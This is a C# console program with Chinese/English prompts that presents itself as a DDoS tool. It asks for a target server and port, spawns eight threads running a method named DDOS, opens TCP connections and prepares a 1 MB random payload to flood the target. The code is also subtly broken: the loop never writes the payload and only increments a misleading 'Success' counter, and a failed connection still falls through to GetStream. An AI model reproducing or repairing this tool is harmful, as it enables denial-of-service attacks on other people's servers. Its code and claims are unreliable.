using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class Program {
    public static string IP;
    public static int Port;
    public static int count = 0;
    static void Main() {
        Console.Clear();
        Console.Write("服务器    |  Server: ");
        Program.IP = Console.ReadLine();
        while (true) {
            Console.Write("端口      |  Port  : ");
            if (int.TryParse(Console.ReadLine(), out Program.Port)) {
                break;
            } else {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("端口不正确|  Invalid input");
                Console.ResetColor();
            }
        }
        Console.CursorVisible = false;
        for (int i = 0; i < 8; i++) {
            Thread t = new Thread(DDOS);
            t.Start();
        }
    }
    static void DDOS() {
        string serverIP = Program.IP;
        int serverPort = Program.Port;
        reclient:
        TcpClient client = new TcpClient();
        try {
            client.Connect(serverIP, serverPort);
            Console.WriteLine("服务器连接成功  |  Connect success.");
        } catch (Exception e) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("服务器连接失败  |  Unable to connect to server.");
            Console.ResetColor();
        }
        NetworkStream stream = client.GetStream();
        int sizeInBytes = 1024 * 1024;
        string randomString = GenerateRandomString(sizeInBytes);
        byte[] buffer = System.Text.Encoding.ASCII.GetBytes(randomString);
        while (true) {
            Program.count++;
            try {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("Success \u0020");
                Console.ResetColor();
                Console.Write(Program.count);
            } catch (Exception e) {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("在发送第" + Program.count + "时发送问题" + e.Message);
                Console.ResetColor();
                goto reclient;
            }
        }
    }
    static string GenerateRandomString(int sizeInBytes) {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
        StringBuilder sb = new StringBuilder(sizeInBytes);
        Random random = new Random();
        for (int i = 0; i < sizeInBytes; i++) {
            sb.Append(chars[random.Next(chars.Length)]);
        }
        return sb.ToString();
    }
}
